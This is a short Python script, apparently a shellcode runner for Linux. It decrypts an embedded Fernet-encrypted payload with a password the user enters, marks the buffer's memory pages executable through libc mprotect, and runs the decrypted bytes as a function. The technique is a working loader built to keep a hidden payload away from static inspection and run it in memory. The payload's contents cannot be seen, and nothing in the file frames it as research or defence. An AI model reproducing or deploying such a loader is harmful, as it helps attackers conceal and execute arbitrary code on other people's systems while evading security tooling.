import string
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import *


encrypted_payload = b"IGEKKR4PLG4OBRO9gAAAAABgR9CX6iIYWS4dWmdJww9D6FvRQxahuQZ0ewmyj6m4bGZrEg86dccH6Wt1dxrv-_Y0Ythruvungpea9JokT8y3etROdVQh5gRY2v-FEVoV3itQc2oQhwX3k4zWI6nguVejKH6a"
#b'2H2FHZU08H095OTDgAAAAABgR88SMnuwPHdQng7-_Vdrd4hw-HaVfxu30VxY1H0S1xtbyvdk7dHKNhi9z4fnWcNJZafxwBlkDI3yhUB4cH6a9BAafA=='


salt = encrypted_payload[:16]
cipher_text = encrypted_payload[16:]



plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt,
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
shellcode_data = cipher_suite.decrypt(cipher_text)


shellcode=create_string_buffer(shellcode_data)
function = cast(shellcode, CFUNCTYPE(None))

addr = cast(function, c_void_p).value
libc = CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize

for page_start in range(addr_page, addr+len(shellcode_data), pagesize):
	assert libc.mprotect(page_start, pagesize, 0x7) == 0
function()